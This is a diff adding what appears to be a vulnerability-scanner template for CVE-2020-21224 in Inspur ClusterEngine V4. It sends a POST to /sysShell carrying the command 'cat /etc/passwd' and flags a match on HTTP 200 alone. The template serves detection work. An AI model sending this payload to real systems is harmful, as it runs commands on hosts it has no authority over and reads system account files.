@@ -1,0 +1,24 @@
+id: inspur-clusterengine-rce
+brief:
+    title: Inspur Clusterengine V4 SYSshell - Remote Command Execution
+    by: ritikchaddha
+    level: critical
+    about: Inspur Clusterengine V4 SYSshell was found and allows remote command execution by design.
+    label:
+        - inspur
+        - clusterengine
+        - rce
+        - vuln
+    score: CVE-2020-21224 CVSS:9.8
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/sysShell'
+      head:
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+        Cookie: lang=cn
+      body: op=doPlease&node=cu01&command=cat+/etc/passwd
+      signs:
+        - "on": status
+          status:
+            - 200
